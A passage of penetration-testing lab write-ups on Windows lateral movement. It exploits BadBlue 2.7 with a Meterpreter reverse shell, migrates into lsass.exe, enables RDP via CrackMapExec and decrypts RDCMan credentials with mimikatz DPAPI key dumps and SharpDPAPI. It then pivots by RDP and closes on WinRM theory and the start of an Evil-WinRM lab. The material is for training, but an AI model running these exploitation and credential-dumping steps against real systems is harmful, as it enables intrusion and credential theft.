[*] Sending stage (176195 bytes) to 10.4.23.124
[*] Meterpreter session 1 opened (10.10.42.2:4444 -> 10.4.23.124:49789) at 2024-08-20 20:14:06 +0530 ←
```

_Interact with the opened Meterpreter session to gain full control over the target machine._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim) machine**</span>.

_Check the user context of the Meterpreter session to confirm that it is running with `Administrator` privileges._

`getuid`:
```
Server username: EC2AMAZ-408S766\Administrator ←
```

_Migrate the Meterpreter process to `lsass.exe` to ensure persistence and stability of the session by attaching to a critical system process._

`migrate -N lsass.exe`:
```
[*] Migrating from 1012 to 708...
[*] Migration completed successfully. ←
```

_Use the shell command to search for files with the keyword `flag` and retrieve the contents to obtain the flag for the lab._

`shell`, `where /r C:\ ""*flag*"`:
```
C:\flag.txt ←
```

_Read the contents of the flag file to complete the objective._

`type C:\flag.txt`:
```
dc6738a4ac0d7a4a379eb300d84af6ae ←
```

<span style="color: #e57373;">**Attacker machine**</span>.

_Enable Remote Desktop Protocol (RDP) on the target machine using CrackMapExec, allowing you to connect via RDP for further control or examination._

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M rdp --options`:
```
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
WEB_DELI... 10.4.23.124     445    EC2AMAZ-408S766  [+] Executed web-delivery launcher
root@attackdefense:~# crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M rdp --options                                
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
[*] rdp module options:

            ACTION  Enable/Disable RDP (choices: enable, disable) ←

```

`crackmapexec smb 10.4.23.124 -u administrator -p 'sebastian' --local-auth -M rdp -o ACTION=enable`:
```
[-] Failed loading module at /usr/lib/python3/dist-packages/cme/modules/slinky.py: No module named 'pylnk3'
SMB         10.4.23.124     445    EC2AMAZ-408S766  [*] Windows 10.0 Build 14393 (name:EC2AMAZ-408S766) (domain:EC2AMAZ-408S766) (signing:False) (SMBv1:False)
SMB         10.4.23.124     445    EC2AMAZ-408S766  [+] EC2AMAZ-408S766\administrator:sebastian (Pwn3d!)
RDP         10.4.23.124     445    EC2AMAZ-408S766  [+] RDP enabled successfully ←
```

_Connect to the target machine using RDP to finalize control over the system._

`xfreerdp /u:administrator /p:sebastian /v:10.4.23.124`

### Windows Lateral Movement via RDP - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a vulnerable application are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the application using the tools available on the Kali machine and exploit it using the appropriate Metasploit module. Then, discover the [RDCMan](https://docs.microsoft.com/en-us/sysinternals/downloads/rdcman) config file and decrypt the second target machine credentials.

**Objective**: Exploit the application and gain the Meterpreter session and find the flag.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Read the IP addresses of the victim machines from the provided target file to identify the machines you need to interact with._

`cat /root/Desktop/target`:
```
Victim Machine 1 : 10.4.23.63 ←
Victim Machine 2 : 10.4.23.154 ←
```

_Ping Victim Machine 1 to verify its availability and connectivity from the attacker machine._

`ping -c 3 10.4.23.63`:
```
PING 10.4.23.63 (10.4.23.63) 56(84) bytes of data.
64 bytes from 10.4.23.63: icmp_seq=1 ttl=125 time=9.76 ms
64 bytes from 10.4.23.63: icmp_seq=2 ttl=125 time=9.31 ms
64 bytes from 10.4.23.63: icmp_seq=3 ttl=125 time=9.98 ms

--- 10.4.23.63 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 9.310/9.682/9.978/0.278 ms
```

_Scan the open ports on Victim Machine 1 using Nmap to identify running services and potential vulnerabilities._

`nmap -Pn -sS -sV 10.4.23.63 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-21 12:42 IST
Nmap scan report for 10.4.23.63
Host is up (0.010s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
80/tcp    open  http          BadBlue httpd 2.7 ←
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.27 seconds
```

_Search for known exploits associated with the BadBlue HTTP server version 2.7 found in the previous Nmap scan using `searchsploit` to identify potential attack vectors._

`searchsploit badblue 2.7`:
```
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                        |  Path
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
BadBlue 2.72 - PassThru Remote Buffer Overflow                                                                        | windows/remote/4784.pl 
BadBlue 2.72b - Multiple Vulnerabilities                                                                              | windows/remote/4715.txt
BadBlue 2.72b - PassThru Buffer Overflow (Metasploit)                                                                 | windows/remote/16806.rb ←
---------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

_Determine the attacker's IP address using `ifconfig` to configure the reverse shell payload correctly._

`ifconfig`:
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.1.0.11  netmask 255.255.0.0  broadcast 10.1.255.255
        ether 02:42:0a:01:00:0b  txqueuelen 0  (Ethernet)
        RX packets 7087  bytes 556851 (543.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 7035  bytes 4176562 (3.9 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.46.4  netmask 255.255.255.0  broadcast 10.10.46.255 ←
        ether 02:42:0a:0a:2e:04  txqueuelen 0  (Ethernet)
        RX packets 66120  bytes 3593701 (3.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 66909  bytes 3892542 (3.7 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 28698  bytes 99786356 (95.1 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 28698  bytes 99786356 (95.1 MiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

_Search for the appropriate BadBlue exploit module in Metasploit, load it, and configure it for the attack. The payload is set to reverse TCP, which will give us control over the target machine once exploited._

`msfconsole -q`

`search badblue`, `use exploit/windows/http/badblue_passthru`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `show options`, `set LHOST 10.10.46.4`, `set LPORT 4444`, `set RHOSTS 10.4.23.63`, `exploit`:
```
[*] Started reverse TCP handler on 10.10.46.4:4444 
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (175174 bytes) to 10.4.23.63
[*] Meterpreter session 1 opened (10.10.46.4:4444 -> 10.4.23.63:49983) at 2024-08-21 12:48:13 +0530 ←
```

_List the active sessions in Metasploit and interact with the newly opened Meterpreter session to start executing commands on the victim machine._

`sessions`, `sessions -i 1`

<span style="color: #64b5f6;">**Target (victim 1) machine**</span>.

_Verify the level of access obtained by checking the current user’s identity. The successful exploit should give us Administrator privileges._

`getuid`:
```
Server username: ATTACKDEFENSE\Administrator ←
```

_Migrate the Meterpreter session to the `lsass.exe` process, which runs with SYSTEM privileges. This will allow us to execute commands with the highest level of access on the victim machine._

`migrate -N lsass.exe`:
```
[*] Migrating from 4364 to 624...
[*] Migration completed successfully. ←
```

_Confirm the privilege escalation to SYSTEM by checking the user identity again._

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM ←
```

_Switch to a regular shell to search for `.rdg` files, which are used by the Remote Desktop Connection Manager (RDCMan) to store RDP session configurations, including credentials._

`shell`, `where /r C:\ "*.rdg"`:
```
C:\Users\Administrator\Documents\Production-Server.rdg ←
```

_Display the contents of the discovered `.rdg` file to extract the RDP credentials for the next target machine._

`type C:\Users\Administrator\Documents\Production-Server.rdg`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<RDCMan programVersion="2.8" schemaVersion="3">
  <file>
    <credentialsProfiles>
      <credentialsProfile inherit="None">
        <profileName scope="Local">ATTACKDEFENSE\Administrator</profileName>
        <userName>Administrator</userName> ←
        <password>AQAAANCMnd8BFdERjHoAwE/Cl+sBAAAAE1DVXDjIxECVqSarB25auwAAAAACAAAAAAAQZgAAAAEAACAAAAA+0scV4eUbeZzmNBTxlywaINPEFJ7ektkD3o+Kj1imugAAAAAOgAAAAAIAACAAAAD55lj7B7BfAiLlc09pkM+snZocXr5disPMWC8QRVFmeSAAAAAvDRw6316bdVZYACrqriDVnthbzifaTLvDEQ81iPbLa0AAAABw+AYzKY0zCmZpAjbhDA3jAEmD02R9SLKOOtuIjr7wP7NzkgNniI+HTxkkZGa0omHwJ3QLD3SJiBjAgdXPocbS</password> ←
        <domain>ATTACKDEFENSE</domain>
      </credentialsProfile>
    </credentialsProfiles>
    <properties>
      <expanded>True</expanded>
      <name>Production-Server</name>
    </properties>
    <server>
      <properties>
        <name>10.4.22.37</name>
      </properties>
      <logonCredentials inherit="None">
        <profileName scope="File">ATTACKDEFENSE\Administrator</profileName>
      </logonCredentials>
    </server>
  </file>
  <connected />
  <favorites />
  <recentlyUsed />
</RDCMan>
```

_Exit the shell to return to the Metasploit console._

`exit`

<span style="color: #e57373;">**Attacker machine**</span>.

_List the files available in the tools directory on the Kali machine to identify any tools that could assist in decrypting the credentials found in the `.rdg` file._

`ls -alps /root/Desktop/tools`:
```
total 7860
   4 drwxr-xr-x 1 root root    4096 Sep  2  2021 ./
   4 drwxr-xr-x 1 root root    4096 Aug 21 12:40 ../
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 Delorean/
   4 drwxrwxr-x 3 root root    4096 Mar  2  2021 FakeLogonScreen/
   4 drwxr-xr-x 3 root root    4096 Dec  7  2020 JohnTheRipper/
   4 drwxrwxr-x 2 root root    4096 Apr 22  2021 PrintSpoofer/
   4 drwxr-xr-x 6 root root    4096 Sep  2  2021 ReflectiveDLLInjection/
   4 drwxrwxr-x 4 root root    4096 Jul  7  2021 SCShell/
 232 -rw-rw-r-- 1 root root  236544 Jan  7  2021 SharPersist.exe
 128 -rw-rw-r-- 1 root root  130048 Sep  2  2021 SharpDPAPI.exe ←
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 firepwd/
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 ircsnapshot/
   4 drwxrwxr-x 6 root root    4096 Apr 22  2021 juicy-potato/
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 known_hosts-hashcat/
   4 drwxrwxr-x 4 root root    4096 Jun 24  2021 mimikatz/
   4 drwxr-xr-x 3 root root    4096 Dec  7  2020 portable/
7424 -rw-rw-r-- 1 root root 7599619 Jun 28  2021 python-3.9.6-embed-win32.zip
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 reGeorg/
   4 drwxr-xr-x 1 root root    4096 Aug 18  2021 scripts/
   4 drwxr-xr-x 1 root root    4096 Aug 17  2021 srtp-decrypt/
   4 drwxr-xr-x 2 root root    4096 Dec  7  2020 steganography/
   4 drwxr-xr-x 1 root root    4096 Sep  2  2021 sysinternals-tools/
```

<span style="color: #64b5f6;">**Target (victim 1) machine**</span>.

_Navigate to the directory where the `.rdg` file was found and upload the `SharpDPAPI.exe` tool to the victim machine. This tool will be used to decrypt the RDP credentials._

`cd 'C:\Users\Administrator\Documents'`

`upload /root/Desktop/tools/SharpDPAPI.exe`:
```
[*] uploading  : /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe
[*] Uploaded 127.00 KiB of 127.00 KiB (100.0%): /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe
[*] uploaded   : /root/Desktop/tools/SharpDPAPI.exe -> SharpDPAPI.exe ←
```

_Execute the SharpDPAPI tool with the `/unprotected` option to decrypt the `.rdg` file and reveal the stored RDP password._

`SharpDPAPI.exe rdg /unprotected`:
```
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.1                               


[*] Action: RDG Triage

[*] Triaging RDCMan.settings Files for ALL users

    RDCManFile    : C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
    Accessed      : 6/24/2021 6:57:31 AM
    Modified      : 6/24/2021 6:57:31 AM

        Default Logon Credentials

          Profile Name : Custom
            UserName   : ATTACKDEFENSE\Administrator

      C:\Users\Administrator\Documents\Production-Server.rdg

        Cred Profiles

          Profile Name : ATTACKDEFENSE\Administrator
            UserName   : ATTACKDEFENSE\Administrator
            Password   : MasterKey needed - {5cd55013-c838-40c4-95a9-26ab076e5abb} ←

        Servers

          Name         : 10.4.22.37
          Cred Profile : ATTACKDEFENSE\Administrator


SharpDPAPI completed in 00:00:05.7758214
```

_Exit the session to return to the Metasploit console and load the `kiwi` extension, which includes tools for extracting DPAPI keys._

`exit`

`load kiwi`:
```
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows) ←
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```

_Use the `dpapi` command within the `kiwi` extension to retrieve the MasterKey needed to decrypt the password._

`kiwi_cmd sekurlsa::dpapi`:
```
Authentication Id : 0 ; 177492 (00000000:0002b554)
Session           : Interactive from 1
User Name         : Administrator
Domain            : ATTACKDEFENSE
Logon Server      : ATTACKDEFENSE
Logon Time        : 8/21/2024 7:10:09 AM
SID               : S-1-5-21-3688751335-3073641799-161370460-500
	 [00000000]
	 * GUID      :	{d62adb8e-0038-40c3-816e-c322c847aa04}
	 * Time      :	8/21/2024 7:10:20 AM
	 * MasterKey :	55574afbc13c7c769d1ceb655b4ef2042dd7d3d6b947d849f4cdd33031997e5fa4fc05738eb10cc1ab3b50582bf3a250bbe2b8b531a7a91bffb210c9b5045598
	 * sha1(key) :	f0a27c9188754a3658c826f3e4eaf8dbb3f6d823
	 [00000001]
	 * GUID      :	{5cd55013-c838-40c4-95a9-26ab076e5abb} ←
	 * Time      :	8/21/2024 7:12:44 AM
	 * MasterKey :	be8dabf90b25d127a8b0421c888f5c23c81f8254c25fa861df4c0e61ed665f79dcac5809c793a5a1b65f3604ec1dd216f74badc6e06b04ebff5b87390ce0c794
	 * sha1(key) :	d174357a9a91ede12834ad2cfc5a9f94f8956205 ←


Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : ATTACKDEFENSE$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 8/21/2024 7:09:26 AM
SID               : S-1-5-20

...

b0649cf68c14f603fc229551055ee13a3a9f70cbe1faf11ee538c44d5b8f749166cecceee8f8ff9b2f378528a0abf331967bd4ab372ba3d8da9e453c7128b042
	 * sha1(key) :	3e10ee51994ef15934037657104dd53502e42437
	 [00000004]
	 * GUID      :	{720cf091-1e13-4961-b446-908f1cc24705}
	 * Time      :	8/21/2024 7:09:39 AM
	 * MasterKey :	af64cb116ddc907cc38bda43b3432305aba9bfc546e3dc018be813f5f71da27a89ba0ebe0a6d7379f10d0d0a6b9322d6ef32301b83c5893a6740eab288b99172
	 * sha1(key) :	211549fef2fc36585d98353edd0488c95ae17f93
	 [00000005]
	 * GUID      :	{67f6a262-0167-4dd3-91e6-2f37823f5f5f}
	 * Time      :	8/21/2024 7:12:49 AM
	 * MasterKey :	89f1a75f854c57d9f36293d3a457f6c8020c25007fba15359582787d092bababa11e0209b5f8913f8713865e3b4306fa6932f5b161d0d5ca2e0736ae1ad0325c
	 * sha1(key) :	30693f71ec68c5e4f96ffc58b0bbc7eaff423f8c
	 [00000006]
	 * GUID      :	{e2977507-edbd-4897-98e0-8db0a2b884df}
	 * Time      :	8/21/2024 7:09:29 AM
	 * MasterKey :	a45fda1c51f799e0181510907bd8c72792136414b22e1623590c5085372774140a60ab089e81bc9cdc003107bb395c98b77d85c61c7d066b5b86dd94f890c436
	 * sha1(key) :	834d12de2ac8d773c02fbb1374423ac23480fd62
	 [00000007]
	 * GUID      :	{74e75caa-a0ca-467d-a06e-dcc4f96f7259}
	 * Time      :	8/21/2024 7:09:25 AM
	 * MasterKey :	cdda1892433b6d86d17dad4c03c5c457e9fe02f1ab9b4cada2c88571bbcacba21f6e297b2fa6b142b5ab1eb538ef51d393631a2f970852161f810ea5caee4c75
	 * sha1(key) :	e726a500b81dca6dc809f0627eaa02d1813066dc
```

_Switch back to the shell to use the extracted MasterKey and GUID to decrypt the RDP credentials._

`shell`

_Use the extracted MasterKey and GUID to decrypt the stored password with `SharpDPAPI.exe`._

`SharpDPAPI.exe rdg {5cd55013-c838-40c4-95a9-26ab076e5abb}:d174357a9a91ede12834ad2cfc5a9f94f8956205`:
```
  __                 _   _       _ ___ 
 (_  |_   _. ._ ._  | \ |_) /\  |_) |  
 __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
                |                      
  v1.11.1                               


[*] Action: RDG Triage

[*] Triaging RDCMan.settings Files for ALL users

    RDCManFile    : C:\Users\Administrator\AppData\Local\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
    Accessed      : 6/24/2021 6:57:31 AM
    Modified      : 6/24/2021 6:57:31 AM

        Default Logon Credentials

          Profile Name : Custom
            UserName   : ATTACKDEFENSE\Administrator

      C:\Users\Administrator\Documents\Production-Server.rdg

        Cred Profiles

          Profile Name : ATTACKDEFENSE\Administrator
            UserName   : ATTACKDEFENSE\Administrator
            Password   : harry_123321 ←

        Servers

          Name         : 10.4.22.37
          Cred Profile : ATTACKDEFENSE\Administrator



SharpDPAPI completed in 00:00:01.0439741
```

<span style="color: #e57373;">**Attacker machine**</span>.

_Confirm the availability of Victim Machine 2 by pinging it before attempting to connect using the decrypted RDP credentials._

`ping -c 3 10.4.23.154`:
```
PING 10.4.23.154 (10.4.23.154) 56(84) bytes of data.
64 bytes from 10.4.23.154: icmp_seq=1 ttl=125 time=11.9 ms
64 bytes from 10.4.23.154: icmp_seq=2 ttl=125 time=10.5 ms
64 bytes from 10.4.23.154: icmp_seq=3 ttl=125 time=10.8 ms

--- 10.4.23.154 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2004ms ←
rtt min/avg/max/mdev = 10.469/11.068/11.899/0.606 ms
```

_Scan the open ports on Victim Machine 2 to identify the RDP service running on port 3389._

`nmap -Pn -sS -sV 10.4.23.154 -p-`:
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2024-08-21 13:15 IST
Nmap scan report for 10.4.23.154
Host is up (0.015s latency).
Not shown: 65520 closed ports
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services ←
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.06 seconds
```

_Use `xfreerdp` to establish an RDP session to Victim Machine 2 using the decrypted credentials._

`xfreerdp /u:administrator /p:harry_123321 /v:10.4.23.154`

<span style="color: #64b5f6;">**Target (victim 2) machine**</span>.

_Confirm the successful connection by checking the current user identity on the target machine._

`whoami`:
```
attackdefense/administrator
```

_Search for the flag on the target machine by recursively listing files with the keyword `flag`._

`Get-ChildItem -Path C:\ -Recurse -Filter "*flag*" -ErrorAction SilentlyContinue`:
```
    Directory: C:\

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----              6/23/2021 11:41 AM         32 flag.txt ←
```

_Display the contents of the `flag.txt` file to retrieve the flag._

`type C:\flag.txt`:
```
fdd2ef1b8c509f1c3ef48693438bdce0 ←
```

### Windows Lateral Movement via WinRM - Theory

#### WinRM

Windows Remote Management (WinRM) is a Windows remote management protocol that can be used to facilitate remote access with Windows systems over HTTP/HTTPS.

Microsoft implemented WinRM into Windows in order to make life easier for system administrators.

WinRM is typically used in the following ways:
- Remotely access and interact with Windows hosts on a local network.
- Remotely access and execute commands on Windows systems.
- Manage and configure Windows systems remotely.

<u>WinRM typically uses TCP port 5985 and 5986 (HTTPS)</u>.

#### WinRM Authentication

WinRM implements access control and security for communication between systems through various forms of authentication.

WinRM authentication involves verifying the identity of a client (such as a remote user or script) attempting to connect to a WinRM service on a Windows system.

There are several authentication mechanisms used by WinRM, each with different security characteristics.

##### NTLM Authentication

**Challenge-Response**: NTLM (NT LAN Manager) authentication operates using a challenge-response mechanism. The client receives a challenge from the server and responds with an encrypted value derived from the NTLM hash.
**Used in Non-Domain Environments**: NTLM is typically used in workgroup environments or when Kerberos is not feasible.
**Less Secure than Kerberos**: NTLM is more prone to attacks like Pass-the-Hash, making it less secure than Kerberos.

##### Basic Authentication

**Basic authentication** sends credentials (username and password) in Base64-encoded format. This method should only be used over HTTPS to ensure encrypted communication.
**Less Secure**: Because credentials are sent in a basic format, this method is less secure compared to Kerberos and NTLM.
**Typically Disabled by Default**: Basic authentication is often disabled by default due to the obvious security risks.

#### WinRM Privileges

To access Windows Remote Management (WinRM), a user account requires certain privileges and permissions. The specific privileges depend on what operations the user is expected to perform with WinRM and whether the environment is configured to restrict access to certain groups or users.

Here’s a breakdown of the necessary user account privileges for accessing WinRM:

**Default Configuration and Access**
By default, WinRM is configured to allow access to users who belong to the local "Administrators" group on a Windows system.
WinRM might also be accessible to users who have been granted specific permissions or rights, depending on configuration and policy settings.

The "Remote Management Users" group is a built-in group in Windows designed to facilitate controlled access to Windows Remote Management (WinRM).

Members of this group have permission to connect to WinRM-enabled systems and execute specific management tasks without requiring full administrative privileges.

#### WinRM Tools

##### Evil-WinRM

Evil-WinRM is an open-source tool designed for interacting with Windows Remote Management (WinRM) services on remote Windows systems.

It is primarily used by penetration testers and red teamers for post-exploitation activities, such as executing commands, transferring files, and gathering information on remote systems.

Evil-WinRM is a popular choice for security professionals seeking to assess the security of Windows environments, especially in contexts where WinRM is enabled and accessible.

##### CrackMapExec and WinRM

CrackMapExec (CME) supports several network protocols, with Windows Remote Management (WinRM) being one of them.

The WinRM functionality in CrackMapExec is particularly useful for assessing the security of Windows environments, allowing testers to interact with remote systems using various authentication methods.

CrackMapExec can execute PowerShell commands or scripts on remote systems via WinRM. This can be used for tasks like gathering system information, creating users, or running custom scripts.

##### PowerShell Remoting (PSRemoting)

PowerShell Remoting, often referred to as PSRemoting, is a feature of PowerShell that allows you to run [PowerShell commands or scripts](https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/ps-remoting-introduction?view=powershell-7.1) on remote computers.

This capability is built on Windows Remote Management (WinRM), a technology designed to facilitate remote management and command execution in Windows environments.

In the context of lateral movement, PSRemoting can be used to access and execute commands on remote systems, making it a valuable tool for both administrators and attackers.

##### Choosing the Right Tool

**For Administrative Tasks:**
	- **Use PSRemoting**: If you need a native PowerShell approach for remote management, automation, or administration, PSRemoting is the best choice.

**For Penetration Testing or Red Teaming:**
	- **Use Evil-WinRM**: If your focus is on WinRM-based penetration testing, Evil-WinRM is a specialized tool designed for this purpose.
	- **Use CrackMapExec**: If you need broader functionality, including support for multiple protocols and credential testing, CME offers a versatile solution for penetration testing and network reconnaissance.

##### References and Resources

- [**Windows Remote Management Reference**](https://learn.microsoft.com/en-us/windows/win32/winrm/portal)
- [**Evil-WinRM*](https://github.com/Hackplayers/evil-winrm)
- [**PSRemoting**](https://learn.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.4).
  
### Windows Lateral Movement via WinRM - Lab

#### Lab Environment

A Kali GUI machine and a target machine running a WinRM server are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (`/root/Desktop/target`). 

Your task is to fingerprint the WinRM service using the tools available on the Kali machine. Then, use the [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) tool to perform a post-exploitation on the WinRM service and load the [Invoke-Mimikatz.ps1](https://github.com/PowerShellMafia/PowerSploit) on the remote server to extract sensitive information i.e. Windows users hashes, LSA secrets, etc.

The following credentials may be used to access the service:
- Username: "administrator"
- Password: "rocknroll_123321".

**Objective**: Exploit the WinRM service load the Invoke-Mimikatz.ps1 on the remote server and dump the administrator user hash.

#### Lab Solution

<span style="color: #e57373;">**Attacker machine**</span>.

_Obtain the target machine's IP address from the provided file to perform subsequent operations on the correct target._

`cat /root/Desktop/target`:
```
Target IP Address : 10.4.18.254 ←
```

_Use the `ping` command to check connectivity to the target machine, ensuring that it is reachable and verifying network stability._

`ping -c 3 10.4.18.254`:
```
PING 10.4.18.254 (10.4.18.254) 56(84) bytes of data.
64 bytes from 10.4.18.254: icmp_seq=1 ttl=125 time=8.80 ms
64 bytes from 10.4.18.254: icmp_seq=2 ttl=125 time=11.6 ms
64 bytes from 10.4.18.254: icmp_seq=3 ttl=125 time=8.86 ms

--- 10.4.18.254 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 8.803/9.742/11.568/1.291 ms
```

_Use `nmap` to perform a thorough scan of the target machine, identifying all open ports and services to understand the attack surface._

`nmap -Pn -sS -sV 10.4.18.254 -p-`:
```
Starting Nmap 7.70 ( https://nmap.org ) at 2024-08-21 14:50 IST
Nmap scan report for 10.4.18.254
Host is up (0.0089s latency).
Not shown: 65523 closed ports
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds ←
3389/tcp  open  ssl/ms-wbt-server?
5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) ←
47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
49175/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.74 seconds
```

**Explanation:** The presence of port `5985` indicates the WinRM service, a potential entry point for lateral movement.

_Confirm the available `crackmapexec` options to prepare for exploiting WinRM._

`crackmapexec --help`:
```
usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--darrell] [--verbose] {ssh,mssql,winrm,smb} ...

      ______ .______           ___        ______  __  ___ .___  ___.      ___      .______    _______ ___   ___  _______   ______
     /      ||   _  \         /   \      /      ||  |/  / |   \/   |     /   \     |   _  \  |   ____|\  \ /  / |   ____| /      |
    |  ,----'|  |_)  |       /  ^  \    |  ,----'|  '  /  |  \  /  |    /  ^  \    |  |_)  | |  |__    \  V  /  |  |__   |  ,----'
    |  |     |      /       /  /_\  \   |  |     |    <   |  |\/|  |   /  /_\  \   |   ___/  |   __|    >   <   |   __|  |  |
    |  `----.|  |\  \----. /  _____  \  |  `----.|  .  \  |  |  |  |  /  _____  \  |  |      |  |____  /  .  \  |  |____ |  `----.
     \______|| _| `._____|/__/     \__\  \______||__|\__\ |__|  |__| /__/     \__\ | _|      |_______|/__/ \__\ |_______| \______|

                                         A swiss army knife for pentesting networks
